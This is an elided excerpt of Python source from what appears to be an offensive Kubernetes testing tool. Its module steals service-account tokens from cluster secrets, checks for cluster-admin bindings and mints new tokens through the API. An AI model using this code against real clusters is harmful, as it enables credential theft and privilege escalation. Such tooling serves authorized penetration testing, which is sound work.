...
from kraken.utils.helpers import b64d, k8s_api_raw, k8s_connect
...
class SAAbuseModule(BaseModule):
    ...
    def _steal_sa_tokens(self, ctx: EngagementContext, target_sa: str) -> list[AttackResult]:
        results: list[AttackResult] = []
            ...
            try:
                ...
                for secret in secrets.items:
                    if secret.type != "kubernetes.io/service-account-token":
                        continue
                    sa_name = (secret.metadata.annotations or {}).get("kubernetes.io/service-account.name", "")
    ...
    def _check_sa_bindings(self, ctx: EngagementContext, sa: str, ns: str) -> bool:
        try:
            ...
            for crb in crbs.items:
                for subj in crb.subjects or []:
                    if (
                        ...
                        and subj.name == sa
                        and getattr(subj, "namespace", "") == ns
                        and crb.role_ref.name == "cluster-admin"
                    ):
                        return True
        except Exception:
            pass
    ...
    def _create_sa_token(self, ctx: EngagementContext, target_sa: str) -> list[AttackResult]:
        if not target_sa:
            return []
        try:
            ...
            ns = ctx.namespace
            resp = k8s_api_raw(
                ctx, f"/api/v1/namespaces/{ns}/serviceaccounts/{target_sa}/token", method="POST", body=token_req
            )
